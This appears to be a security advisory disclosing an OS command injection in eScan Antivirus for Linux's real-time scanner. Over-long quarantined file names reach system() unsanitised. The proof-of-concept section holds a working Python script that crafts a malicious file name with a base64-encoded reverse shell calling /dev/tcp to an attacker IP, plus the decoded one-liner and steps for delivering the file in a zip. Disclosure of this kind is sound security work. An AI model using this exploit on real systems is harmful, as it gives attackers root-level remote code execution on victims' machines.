# Description and Impact
Escan Antivirus for Linux has real-time protection program `rtscanner` run as system service. This program has a OS Command injection vulnerability in quarantine file mechanism. An attacker can send crafted file and gain remote code execution with highest privilege as soon as crafted file writes into victim's disk.

# Root-cause
1. `rtscanner` failed to quarantine a file that has name **>= 253** characters (max file name's length on Linux is 255). This program uses command `mv` to move file to quarantine folder.
2. `rtscanner` uses dangerous function `system` with unsanitized data.

![image](https://github.com/user-attachments/assets/b63d71ed-2c7e-49db-9d57-efe79099fd51)

3. By default, `/tmp/` and `/home/` are being monitored

![image](https://github.com/user-attachments/assets/f427f130-c92e-43cd-a3d2-db708cc46bb2)

An attacker can send any malicious file with crafted file name. As soon as crafted file writes into these folders, quarantine mechanism executes and malicious code command is executed with system's privilege.

In demotration bellow, I sent compressed file that contains malicious file to victim's machine. By default, compressed files are not being scanned by real-time scanner. Malicious code executes as soon as user uncompress downloaded file.

![image](https://github.com/user-attachments/assets/962d5187-a847-4131-9945-6fd254c7d39b)

*Important notes*:
- When decompress using `Extract here` feature, program `engrampa` extracts internal file into a folder if there's no folder. The format will be `<name of compressed file> <suffix>` where suffix is a number, like `(2)`, `(3)`. Meanwhile real-time scanner adds folder `<name of compressed file>` to **inotify**'s watch list. This is a logic bug in scanner's logic. Therefore, compressed file delivered to victim must contains internal folder that has the same name with zip file.
- Demotration shows malicious code execution when file is decompressed. In other attack scenarios, malicious code might be executed *as soon as crafted file is written into victim's system* without user's interactions.
- Servers that has file upload feature and eScan for Linux (configured to monitor uploaded files) are under great danger.

# Proof-of-concept
1. Create crafted file that executes bash redirection to make reverse shell. Python script:

```
MAX_LEN=253

# Payload to trigger reverse shell
# bash -c 'exec bash -i &>/dev/tcp/192.168.58.192/8888 <&1'
PAYLOAD=";echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC41OC4xOTIvODg4OCA8JjEnCg==|base64 -d|sh"
PREFIX="AA AA" # Doesn't really required. But it looks a little better
SUFFIX=" # "
CHUNK="A" * (MAX_LEN - len(PREFIX) - len(PAYLOAD) - len(SUFFIX))
NAME=PREFIX + PAYLOAD + SUFFIX + CHUNK

print("DEBUG: created file with len", len(NAME))

# Content to trigger quarantine action
CONTENT="X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

with open("/tmp/" + NAME, "w") as f:
    f.write(CONTENT)
```

2. Create compressed zip file that contain crafted file and move it to web server.

![image](https://github.com/user-attachments/assets/1f1a110d-f61f-421e-9d80-ee055a30bccf)

![image](https://github.com/user-attachments/assets/0a048f52-4473-4bb6-9e4e-c8b435870c44)

Attacker creates a listener and wait victim's download malicious file.

![image](https://github.com/user-attachments/assets/1f1fc670-1372-4476-b946-8164d14347e1)


3. Victim downloads zip file then extract

![image](https://github.com/user-attachments/assets/24482606-d03c-41ac-b7e0-43b9b3606feb)

![image](https://github.com/user-attachments/assets/70e2d760-c482-4ca2-814e-53af386f9958)

4. Attacker gains remote code execution

![image](https://github.com/user-attachments/assets/4b15a68f-af35-48f4-8e84-32e1260dfe6f)

![image](https://github.com/user-attachments/assets/b4720dfe-fac8-49e0-9772-e47222095b03)
